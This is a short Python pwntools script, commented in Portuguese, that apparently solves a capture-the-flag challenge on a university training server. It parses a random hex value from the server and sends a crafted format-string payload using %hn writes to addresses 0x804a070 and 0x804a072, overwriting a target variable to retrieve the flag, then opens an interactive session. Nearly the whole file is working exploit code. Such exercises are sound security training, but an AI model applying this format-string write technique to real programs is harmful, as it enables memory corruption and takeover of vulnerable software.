#recebo random, 
#converto para decimal -4
#envio o nr e recebo a flag

from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 22196

### run a remote process
s = remote(SERVER, PORT, timeout=9999)
Target = "0x804a070" 

line = s.recvline()

line_str = str(line)
index1 = str(line).index("x", 0)
#print(index1)

rand_hex = line_str[index1+1:len(line_str) - 3]
#print("rand hex = ", rand_hex)

rand_hex_0_3 = rand_hex[0:4]
#print(rand_hex_0_3, int(rand_hex_0_3, 16))
rand_int_0_3 = int(rand_hex_0_3, 16)
#print("rand_hex_0_3", rand_hex_0_3)

rand_hex_4_end = rand_hex[4:]
print(rand_hex_4_end, int(rand_hex_4_end, 16))
rand_int_4_end = int(rand_hex_4_end, 16)
#print("rand_int_4_end", rand_int_4_end)
#print("rand_hex_4_end", rand_hex_4_end)

target_address = "0x804a070"
p1 = rand_int_0_3 -8
p2 = rand_int_4_end - rand_int_0_3
nr = 100
s.send(p32(0x804a072) + p32(0x804a070) + b"%" +bytes(str(p1), 'utf-8') + b"x%7$hn%" +bytes(str(p2), 'utf-8') + b"x%8$hn")

r = s.recv()
print(rand_hex) 
print(r)
s.interactive()

